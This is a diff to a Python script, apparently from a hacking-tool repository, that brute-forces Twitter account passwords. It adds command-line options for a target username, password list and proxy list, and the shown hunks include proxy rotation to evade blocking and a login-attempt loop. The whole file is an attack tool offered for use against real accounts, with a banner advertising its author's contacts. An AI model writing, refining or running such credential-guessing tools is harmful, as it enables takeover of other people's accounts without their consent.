@@ -1,9 +1,18 @@
 import mechanize
 import argparse
 import sys
-import os
 from proxylist import ProxyList
 import logging
+
+
+parser = argparse.ArgumentParser(description="Brute force a Twitter account's password.")
+parser.add_argument("-u", "--username", help="Username of the account to brute force", required=True)
+parser.add_argument("-p", "--password", help="Password list", required=False)
+parser.add_argument("-pl", "--proxy", help="Proxy list", required=False)
+args = parser.parse_args()
+username = args.username
+passwordList = args.password if args.password else "pass.txt"
+proxyList = args.proxy if args.proxy else "proxy.txt"
 
 
 print('''\033[1;36m
@@ -21,15 +30,14 @@ print('''\033[1;36m
             `._)`/
              /--(
           -./,--'`-,
-       ,^--(                    
-       ,--' `-,         v1.2  
+       ,^--(
+       ,--' `-,         v1.2
         **************************************
         * -> Development: 0xfff0800          *
         * -> Telegram: https://T.me/xfff0800 *
         * -> snapchat: flaah999              *
-        **************************************                                                 
+        **************************************
 \033[1;m''')
-
 
 
 b = mechanize.Browser()
@@ -40,13 +48,11 @@ b.set_handle_referer(True)
 b.set_handle_robots(False)
 b._factory.is_html = True
 
-b.addheaders = [('User-agent',
-                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
-                 )]
+b.addheaders = [(
+  'User-agent',
+  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
+)]
 
-username = input('\033[1;37muser : \033[1;37m')
-passwordList = input('\033[1;37mpassword : \033[1;37m')
-proxyList = input('\033[1;37mproxy : \033[1;37m')
 def proxy():
     logging.basicConfig()
     pl = ProxyList()
@@ -61,8 +67,8 @@ def proxy():
         checkProxyIP = b.open("https://api.ipify.org/?format=raw", timeout=2)
     except:
         return proxy()
-        
-        
+
+
 def Twitter():
     password = open(passwordList).read().splitlines()
     try_login = 0
@@ -96,7 +102,7 @@ def Twitter():
             sys.stdout.flush()
             proxy()
             break
-            
+
 if __name__ == '__main__':
     Twitter()
     proxy()
